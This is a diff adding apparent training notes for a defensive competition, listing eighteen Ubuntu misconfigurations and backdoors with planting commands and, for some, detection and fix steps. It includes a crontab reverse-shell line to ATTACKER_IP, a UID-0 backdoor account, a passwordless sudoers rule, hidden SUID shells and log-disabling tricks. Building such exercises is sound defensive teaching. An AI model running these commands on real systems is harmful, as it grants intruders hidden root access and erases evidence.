@@ -1,0 +1,99 @@
+Ubuntu Misconfigs
+
+1. World-Writable Sensitive Files
+	Change permissions on the shadow file (which stores password hashes) or the crontab: sudo chmod 777 /etc/crontab
+	The Lesson: An attacker can now add a line to the crontab that runs a "Reverse Shell" as Root every minute: * * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+	Verification: Have the student run ls -l /etc/crontab. If they see -rwxrwxrwx, the system is "compromised."
+
+2. Exposing Shadow File
+	sudo chmod 644 /etc/shadow
+	Allows any user to read the encrypted password hashes and run password cracking against them
+
+3. Exposing History Files (Information Leakage)
+	chmod 644 ~/.bash_history
+	Makes history world readable. If an admin typed a password in a command any user can run cat /home/{user}/.bash_history and fine clear-text password
+	Fix: history files should be set to 600 (read/write owner only) 
+
+4. Backdoor Root-Equivalency Account
+	sudo useradd -u 0 -o -g 0 -M -d /root -s /bin/bash sysadmin
+	user account sysadmin has same powers as root
+	run awk -F: '($3 == "0") {print $1}' /etc/passwd. If they see anything other than root, they found the backdoor.
+
+5. Log Tampering Misconfig
+	sudo nano /etc/login.defs  set FAILLOG_ENAB to no and set LOG_UNKFAIL_ENAB to no
+	disable the logging of failed login attempts
+
+6. Ultimate Bypass (SUID Bit on Text Editors)
+	sudo chmod +s /usr/bin/nano
+	Regular user can now run nano /etc/shadow and simply delete root's password or add their own.
+	Students must run find / -perm -4000 -type f 2>/dev/null, identify nano as an "illegal" SUID binary, and run sudo chmod -s /usr/bin/nano
+
+7. World-Writable App Directory (Staging Area)
+	sudo mkdir /opt/service && sudo chmod 777 /opt/service
+	Poorly configured application folders are often used as "dead drops" for malware
+	This folder will likely be missed by an admin just checking /etc. It allows an attacker to hide tools that bypass standard file system monitoring.
+	The Solve: Students must audit the entire /opt and /var/www directories for 777 permissions.
+
+8. SSH permit empty passwords
+	sudo useradd -m -s /bin/bash guest_account
+	sudo passwd -d guest_account
+	This adds a user with no password
+	sudo nano /etc/ssh/sshd_config
+	set PermitEmptyPasswords to yes
+	Shouldn't have a user with empty password on the system
+
+9. Stealth Binary
+	/bin/dash
+	sudo cp /bin/dash /usr/bin/.sys_diagnostic
+	sudo chmod 4755 /usr/bin/.sys_diagnostic
+	Copies /bin/dash to /usr/bin/ and makes it hidden from ls commands by starting the name with a dot
+	4 tells Linux that whoever runs this file should act with the power of the files owner
+
+10. Information Reconnaissance Descriptive Banner
+	echo "Welcome to Ubuntu 24.04 - CCDC Server" | sudo tee /etc/issue.net
+	sudo nano /etc/ssh/sshd_config
+	Change #Banner none to Banner /etc/issue.net 
+	Connecting shows the banner and gives away what type of Ubuntu server it is
+
+11. IPv4 Forwarding Enabled
+	Can use this setting to "bounce" their attack traffic through your server to hit the internal database that was supposed to be hidden
+	sudo sysctl -w net.ipv4.ip_forward=1
+	echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
+	stays broken even after a reboot
+	tells the Linux Kernel: "If you receive a packet that isn't for you, don't drop it. Instead, look at the destination IP and try to pass it along to the next hop."
+
+12. ICMP Redirects (Lying Gateway Attack) (Companion to IPv4 Forwarding.)
+	sudo sysctl -w net.ipv4.conf.all.accept_redirects=1
+	Persistence: echo "net.ipv4.conf.all.accept_redirects=1" | sudo tee -a /etc/sysctl.conf
+	Accepting Redirects allows your machine to be lied to about who the router is.
+ 
+13. World-Writeable /etc/environment
+	sudo chmod 777 /etc/environment
+	lets /etc/environment be accessible to everyone
+
+14. "Broken" System Log (Anti-Forensics)
+	sudo ln -sf /dev/null /var/log/syslog
+	Make the system think it's logging, but send all the data to /dev/null (the digital black hole)
+	The Solve: Remove the symbolic link and restart the logging service. sudo rm /var/log/syslog && sudo systemctl restart rsyslog
+
+15. Sudoers Loophole (Wildcard Access)
+	echo "guest_account ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/backdoor
+	guest_account can become root without a password
+
+16. Hidden Cron Job (Persistence Ghost)
+	echo "* * * * * root chmod 777 /etc/shadow" | sudo tee /etc/cron.d/.sys_sync
+	can only see .sys_sync file when running ls -la /etc/cron.d/ not normal ls
+	sudo chmod 644 /etc/cron.d/.sys_sync
+	Set the File Permissions Cron will ignore files in this directory if they are world-writable or have "Group" write access. The file must be strictly managed.
+
+17. MotD (Message of the Day) Code Injection
+	echo "chmod 777 /etc/shadow" | sudo tee -a /etc/update-motd.d/00-header
+	Create the Backdoor hide a command inside the header script so it runs silently in the background
+	sudo chmod 600 /etc/shadow
+	sudo run-parts /etc/update-motd.d/
+	ls -l /etc/shadow
+	
+18. Password Quality Nullification (The "Weak Policy" Trap)
+	sudo nano /etc/pam.d/common-password
+	change password [success=1 default=ignore] pam_unix.so obscure yescrypt to password [success=1 default=ignore] pam_unix.so minlen=1 yescrypt
+	The Fix: Change minlen=1 to minlen=8 (or higher). or Add the word obscure back into the line.
